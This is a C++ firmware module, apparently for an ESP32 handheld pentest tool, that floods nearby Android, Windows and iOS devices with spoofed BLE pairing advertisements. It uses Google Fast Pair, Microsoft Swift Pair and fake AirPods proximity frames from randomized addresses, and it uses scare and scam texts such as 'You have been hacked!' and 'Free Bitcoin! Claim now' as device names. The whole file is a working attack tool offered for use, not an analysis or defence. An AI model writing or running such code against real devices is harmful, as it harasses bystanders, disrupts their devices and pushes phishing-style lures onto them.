// ═══════════════════════════════════════════════════════════
// Arsenal - SMS-style Notification Spoofer
// Pushes fake notifications to nearby Android devices via BLE
// Uses the BLE notification service advertisement pattern
// ═══════════════════════════════════════════════════════════

#include "arsenal.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include <BLEAdvertising.h>
#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>
#include <globals.h>

// NimBLE random address function
extern "C" int ble_hs_id_set_rnd(const uint8_t *rnd_addr);

// Predefined notification messages
static const char *NOTIF_MESSAGES[] = {
    "You have been hacked!",
    "Your WiFi password is exposed",
    "Someone is watching you",
    "Security alert: device compromised",
    "Update required: tap here",
    "Free Bitcoin! Claim now",
    "Warning: malware detected",
    "Your location is being shared",
    "Camera access detected",
    "Unauthorized login attempt",
};
static const int NUM_MESSAGES = sizeof(NOTIF_MESSAGES) / sizeof(NOTIF_MESSAGES[0]);

// BLE GATT notification services
// Apple Notification Center Service (ANCS) UUID
#define ANCS_SERVICE_UUID "7905F431-B5CE-4E99-A40F-4B1E122D00D0"
// Notification Source Characteristic
#define NOTIF_SOURCE_UUID "9FBF120D-6301-42D9-8C58-25E699A21DBD"

static BLEServer *pServer = nullptr;
static BLECharacteristic *pNotifChar = nullptr;
static int notifsSent = 0;
static bool serverActive = false;

// Microsoft Swift Pair - makes Windows devices show "New device found" popup
static void sendSwiftPairSpam(BLEAdvertising *adv) {
    BLEAdvertisementData advData;

    // Microsoft Swift Pair beacon
    // Vendor specific: Microsoft company ID (0x0006)
    String mfgData = "";
    mfgData += (char)0x06;  // Microsoft company ID low
    mfgData += (char)0x00;  // Microsoft company ID high
    mfgData += (char)0x03;  // Swift Pair scenario
    mfgData += (char)0x00;  // Reserved
    // Device name payload (random to make unique devices)
    for (int i = 0; i < 6; i++) {
        mfgData += (char)random(256);
    }

    advData.setManufacturerData(mfgData);
    advData.setName(NOTIF_MESSAGES[random(NUM_MESSAGES)]);
    advData.setFlags(0x06);

    adv->setAdvertisementData(advData);
}

// Google Fast Pair - makes Android devices show "Device nearby" notification
static void sendGoogleFastPair(BLEAdvertising *adv) {
    BLEAdvertisementData advData;

    // Google Fast Pair service data
    // Service UUID: 0xFE2C
    String serviceData = "";
    serviceData += (char)0x2C;  // Google Fast Pair UUID low
    serviceData += (char)0xFE;  // Google Fast Pair UUID high
    // Model ID (random - triggers "device nearby" on Android)
    for (int i = 0; i < 3; i++) {
        serviceData += (char)random(256);
    }

    advData.setServiceData(BLEUUID((uint16_t)0xFE2C), serviceData);
    advData.setFlags(0x06);

    adv->setAdvertisementData(advData);
}

// Apple BLE Proximity - triggers "AirPods nearby" popup on iOS
static void sendAppleProximityPairing(BLEAdvertising *adv) {
    BLEAdvertisementData advData;

    // Apple company ID: 0x004C
    // Proximity pairing type: 0x07 (length 0x19)
    // This triggers the "Not Your AirPods" popup on nearby iPhones
    String mfgData = "";
    mfgData += (char)0x4C;  // Apple company ID low
    mfgData += (char)0x00;  // Apple company ID high
    mfgData += (char)0x07;  // Proximity pairing type
    mfgData += (char)0x19;  // Length
    mfgData += (char)0x07;  // Status (prefix byte)

    // Device model bytes (different values = different device popups)
    // Known models:
    //   0x0220 = AirPods Pro
    //   0x0E20 = AirPods (3rd gen)
    //   0x0A20 = AirPods Max
    //   0x1420 = AirPods Pro 2
    //   0x0320 = Powerbeats Pro
    static const uint8_t models[][2] = {
        {0x02, 0x20},  // AirPods Pro
        {0x0E, 0x20},  // AirPods 3rd gen
        {0x0A, 0x20},  // AirPods Max
        {0x14, 0x20},  // AirPods Pro 2
        {0x03, 0x20},  // Powerbeats Pro
        {0x12, 0x20},  // Beats Fit Pro
        {0x10, 0x20},  // Beats Flex
    };
    int modelIdx = random(7);
    mfgData += (char)models[modelIdx][0];
    mfgData += (char)models[modelIdx][1];

    // Fill remaining bytes with random data
    for (int i = 0; i < 22; i++) {
        mfgData += (char)random(256);
    }

    advData.setManufacturerData(mfgData);
    advData.setFlags(0x06);

    adv->setAdvertisementData(advData);
}

void arsenal_sms_notification_spoofer(void) {
    ARSENAL_SAFE_RUN([]() {
        notifsSent = 0;

        // Select mode
        options.clear();
        int mode = -1;
        options.push_back({"Android (Fast Pair)", [&mode]() { mode = 0; }});
        options.push_back({"Windows (Swift Pair)", [&mode]() { mode = 1; }});
        options.push_back({"iOS (AirPods Popup)", [&mode]() { mode = 3; }});
        options.push_back({"All Platforms", [&mode]() { mode = 2; }});

        loopOptions(options, MENU_TYPE_SUBMENU, "Target Platform");

        if (mode < 0) return;

        BLEDevice::init("");
        BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();

        unsigned long startTime = millis();

        while (true) {
            // Randomize BLE address for each advertisement
            uint8_t addr[6];
            for (int i = 0; i < 6; i++) addr[i] = random(256);
            addr[0] |= 0xC0;  // random static
            ble_hs_id_set_rnd(addr);

            // Send appropriate spam type
            if (mode == 0 || (mode == 2 && notifsSent % 3 == 0)) {
                sendGoogleFastPair(pAdvertising);
            }
            if (mode == 1 || (mode == 2 && notifsSent % 3 == 1)) {
                sendSwiftPairSpam(pAdvertising);
            }
            if (mode == 3 || (mode == 2 && notifsSent % 3 == 2)) {
                sendAppleProximityPairing(pAdvertising);
            }

            pAdvertising->start();
            delay(30);
            pAdvertising->stop();
            notifsSent++;

            // Draw UI every 10 packets
            if (notifsSent % 10 == 0) {
                drawMainBorderWithTitle("Notif Spoofer");
                int y = 45;
                int padX = 12;

                tft.setTextColor(TFT_MAGENTA, bruceConfig.bgColor);
                tft.setTextSize(FP);
                tft.setCursor(padX, y);
                tft.print("SPAMMING NOTIFICATIONS");
                y += 16;

                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
                tft.setCursor(padX, y);
                String modeStr = mode == 0 ? "Android" : mode == 1 ? "Windows" : "All";
                tft.print("Mode: " + modeStr);
                y += 14;

                tft.setCursor(padX, y);
                tft.printf("Notifications: %d", notifsSent);
                y += 14;

                unsigned long elapsed = (millis() - startTime) / 1000;
                tft.setCursor(padX, y);
                tft.printf("Elapsed: %lus", elapsed);
                y += 14;

                tft.setCursor(padX, y);
                tft.printf("Rate: ~%d/sec", notifsSent / max(1UL, elapsed));
                y += 18;

                tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
                tft.setCursor(padX, y);
                tft.print("Nearby devices will see");
                y += 12;
                tft.setCursor(padX, y);
                tft.print("phantom device popups!");

                tft.setTextColor(TFT_RED, bruceConfig.bgColor);
                tft.drawCentreString("Esc to stop", tftWidth / 2, tftHeight - 20, 1);
            }

            if (check(EscPress)) break;
            esp_task_wdt_reset();
            delay(10);
        }

        pAdvertising->stop();
        BLEDevice::deinit(false);
    });
}
